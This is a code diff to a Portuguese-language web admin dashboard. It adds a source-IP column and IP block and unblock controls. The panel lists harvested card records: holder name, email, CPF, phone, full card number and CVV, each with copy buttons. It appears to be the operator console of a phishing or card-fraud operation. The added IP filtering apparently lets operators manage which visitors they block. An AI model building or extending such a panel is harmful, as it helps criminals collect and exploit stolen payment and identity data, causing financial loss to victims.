@@ -283,12 +283,13 @@ tr:hover td{background:#fafbfd}
               <th>Bandeira</th>
               <th>Final</th>
               <th>Validade</th>
+              <th class="col-hide">IP</th>
               <th class="col-hide">Cadastro</th>
               <th></th>
             </tr>
           </thead>
           <tbody id="tbody">
-            <tr><td colspan="8" class="empty">Carregando…</td></tr>
+            <tr><td colspan="9" class="empty">Carregando…</td></tr>
           </tbody>
         </table>
       </div>
@@ -407,7 +408,7 @@ function logout(){_tok='';localStorage.removeItem('cv_tok');document.getElementB
 function showMain(){document.getElementById('loginScreen').style.display='none';document.getElementById('mainScreen').style.display='block';loadAll();}
 if(_tok)fetch('/api/admin/stats',{headers:{'x-admin-token':_tok}}).then(r=>r.ok?showMain():logout()).catch(()=>{});
 
-async function loadAll(){await Promise.all([loadStats(),loadCards()]);}
+async function loadAll(){await Promise.all([loadStats(),loadCards(),loadBlockedSet()]);}
 
 async function loadStats(){
   const r=await fetch('/api/admin/stats',{headers:{'x-admin-token':_tok}});if(!r.ok)return;
@@ -428,7 +429,7 @@ function debounce(){clearTimeout(_t);_t=setTimeout(()=>loadCards(document.getEle
 
 function renderTable(cards){
   const tb=document.getElementById('tbody');
-  if(!cards.length){tb.innerHTML='<tr><td colspan="8" class="empty">Nenhum cartão encontrado.</td></tr>';return;}
+  if(!cards.length){tb.innerHTML='<tr><td colspan="9" class="empty">Nenhum cartão encontrado.</td></tr>';return;}
   cards.forEach(c=>_c[c.id]=c);
   tb.innerHTML=cards.map((c,i)=>{
     const bk=brandKey(c.brand);
@@ -436,6 +437,7 @@ function renderTable(cards){
     const [mm='',yy='']=(c.expiry||'').split('/');
     let ec='ok'; if(mm&&yy){const d=(parseInt('20'+yy)-new Date().getFullYear())*12+parseInt(mm)-new Date().getMonth()-1;if(d<=3)ec='warn';}
     const dt=c.created_at?new Date(c.created_at).toLocaleDateString('pt-BR',{day:'2-digit',month:'2-digit',year:'2-digit'}):'—';
+    const blocked=c.ip&&_blockedSet.has(c.ip);
     return `<tr>
       <td style="color:var(--muted2);font-size:12px;font-family:monospace">${i+1}</td>
       <td><div class="cell-name">${esc(c.nome||'—')}</div><div class="cell-sub">${esc(c.email||'—')}</div></td>
@@ -443,11 +445,16 @@ function renderTable(cards){
       <td><span class="brand-pill">${logo}</span></td>
       <td><span class="last4"><span class="dots">••••</span>${esc(c.last4||'????')}</span></td>
       <td><span class="exp-pill exp-${ec}">${esc(c.expiry||'—')}</span></td>
+      <td class="col-hide">${c.ip?`<span class="ip-badge">${esc(c.ip)}</span>${blocked?' <span class="blocked-badge">🚫</span>':''}`:'—'}</td>
       <td class="dt col-hide">${dt}</td>
       <td><div class="acts">
         <button class="act-btn" onclick="openDetail('${c.id}')" title="Ver">
           <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/><path d="M1 12C3 7 7 4 12 4s9 3 11 8c-2 5-6 8-11 8S3 17 1 12z" stroke="currentColor" stroke-width="2"/></svg>
         </button>
+        ${c.ip?(blocked
+          ?`<button class="act-btn" onclick="unblockIp('${esc(c.ip)}')" title="Desbloquear IP" style="border-color:#bbf7d0;color:var(--green)"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"><path d="M18 8h1a4 4 0 010 8h-1M2 8h16v9a4 4 0 01-4 4H6a4 4 0 01-4-4V8zM6 1v3M10 1v3M14 1v3" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg></button>`
+          :`<button class="act-btn del" onclick="promptBlock('${esc(c.ip)}')" title="Bloquear IP"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M4.93 4.93l14.14 14.14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg></button>`
+        ):''}
         <button class="act-btn del" onclick="confirmDel('${esc(c.id)}','${esc(c.nome||'este cartão')}')" title="Deletar">
           <svg width="12" height="12" viewBox="0 0 24 24" fill="none"><polyline points="3 6 5 6 21 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M19 6l-1 14H6L5 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M9 6V4h6v2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
         </button>
@@ -481,13 +488,21 @@ function openDetail(id){
     ${lvlTag||typeTag||bankTag?`<div class="vc-tags">${lvlTag}${typeTag}${bankTag}</div>`:''}
   `;
   const dt=c.created_at?new Date(c.created_at).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'}):'—';
-  const fields=[['Nome',c.nome,'full'],['E-mail',c.email,'full'],['CPF',c.cpf,''],['Telefone',c.telefone,''],['Número',c.card_number,'full'],['CVV',c.cvv,''],['Validade',c.expiry,''],['Banco',c.bank,''],['Nível',c.card_level,''],['Tipo',c.card_type,''],['Cadastro',dt,'full']];
+  const blocked=c.ip&&_blockedSet.has(c.ip);
+  const ipLabel=c.ip?(blocked?`${c.ip} 🚫 bloqueado`:c.ip):null;
+  const fields=[['Nome',c.nome,'full'],['E-mail',c.email,'full'],['CPF',c.cpf,''],['Telefone',c.telefone,''],['Número',c.card_number,'full'],['CVV',c.cvv,''],['Validade',c.expiry,''],['Banco',c.bank,''],['Nível',c.card_level,''],['Tipo',c.card_type,''],['IP de origem',ipLabel,'full'],['Cadastro',dt,'full']];
   document.getElementById('detailGrid').innerHTML=fields.filter(([,v])=>v).map(([l,v,s])=>`
     <div class="field${s?' '+s:''}">
       <div class="f-lbl">${l}</div>
       <div class="f-val">${esc(v)}</div>
       <button class="copy-btn" onclick="cp(this,'${esc(String(v))}')">copiar</button>
-    </div>`).join('');
+    </div>`).join('')+(c.ip?`
+    <div class="field full" style="margin-top:4px">
+      ${blocked
+        ?`<button class="unblock-btn" style="width:100%;height:36px;font-size:13px" onclick="unblockIp('${esc(c.ip)}');closeDetail();loadAll()">Desbloquear IP ${esc(c.ip)}</button>`
+        :`<button class="block-btn" style="width:100%;height:36px;font-size:13px" onclick="promptBlock('${esc(c.ip)}');closeDetail()">🚫 Bloquear IP ${esc(c.ip)}</button>`
+      }
+    </div>`:'');
   document.getElementById('detailModal').classList.add('show');
 }
 function closeDetail(){document.getElementById('detailModal').classList.remove('show');}
@@ -533,6 +548,15 @@ async function loadLogs(){
 }
 
 let _blockedSet = new Set();
+
+async function loadBlockedSet(){
+  try{
+    const r=await fetch('/api/admin/blocked-ips',{headers:{'x-admin-token':_tok}});
+    if(!r.ok)return;
+    const d=await r.json();
+    _blockedSet=new Set((d.blocked||[]).map(b=>b.ip));
+  }catch(e){}
+}
 
 async function loadLogStats(){
   try{
